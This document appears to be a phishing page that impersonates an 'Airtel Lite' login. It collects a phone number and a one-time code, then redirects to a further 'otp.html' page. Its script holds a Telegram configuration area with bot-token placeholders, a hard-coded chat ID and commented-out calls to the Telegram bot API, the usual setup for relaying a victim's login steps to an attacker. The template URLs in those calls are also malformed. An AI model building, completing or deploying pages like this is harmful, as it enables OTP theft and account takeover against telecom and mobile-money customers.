<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Airtel Lite Login</title>

<style>
body {
    margin: 0;
    background: #f6f7fb;
    font-family: Arial, sans-serif;
}

.container {
    max-width: 420px;
    margin: auto;
    padding: 40px 20px;
    text-align: center;
}

.card {
    background: white;
    padding: 30px 20px;
    border-radius: 18px;
    box-shadow: 0 10px 30px rgba(0,0,0,0.1);
}

input, button {
    width: 100%;
    padding: 14px;
    border-radius: 10px;
    font-size: 16px;
    margin-bottom: 15px;
}

input {
    border: 1px solid #ccc;
}

button {
    border: none;
    background: #ff3b3b;
    color: white;
    cursor: pointer;
}

button:disabled {
    background: #ccc;
}

.hidden {
    display: none;
}

.status {
    font-size: 14px;
    color: gray;
}
</style>
</head>

<body>

<div class="container">
    <div class="card">

        <h2>LOGIN TO AIRTEL LITE</h2>

        <!-- PHONE INPUT -->
        <input type="tel" id="phone" placeholder="+260XXXXXXXX" required>

        <button id="sendBtn" onclick="sendOTP()">SEND OTP</button>

        <div class="status" id="status"></div>

        <!-- OTP SECTION -->
        <div id="otpSection" class="hidden">
            <input type="text" id="otp" placeholder="Enter OTP">
            <button onclick="continueLogin()">CONTINUE</button>
        </div>

    </div>
</div>

<script>
function sendOTP() {
    const phone = document.getElementById("phone").value.trim();

    if (!phone) {
        alert("Please enter phone number");
        return;
    }

    // ===============================
    // 🔐 TELEGRAM CONFIGURATION AREA
    // ===============================
    // const BOT_TOKEN = "PASTE_BOT_TOKEN_HERE";
    // const CHAT_ID  = "PASTE_CHAT_ID_HERE";

    // Send telegram try:
    /*
    fetch(https://api.telegram.org/bot${BOT_TOKEN}/sendMessage, {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({
            chat_id: CHAT_ID,
            text: "User requested OTP on Airtel Lite"
        })
    });
    */

    document.getElementById("status").innerText =
        "OTP sent. Please check your phone.";

    document.getElementById("otpSection").classList.remove("hidden");
    document.getElementById("sendBtn").disabled = true;
}

function continueLogin() {
    const otp = document.getElementById("otp").value;

    if (!otp) {
        alert("Enter OTP");
        return;
    }

    // const CHAT_ID  = "8588753899";

    // Send telegram try:
    /*
    fetch(https://api.telegram.org/bot${BOT_TOKEN}/sendMessage, {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({
            chat_id: CHAT_ID,
            text: "User requested OTP on Airtel Lite"
        })
    });
    */

    // ✅ Redirect to your existing OTP page
    window.location.href = "otp.html";
}
</script>

</body>
</html>
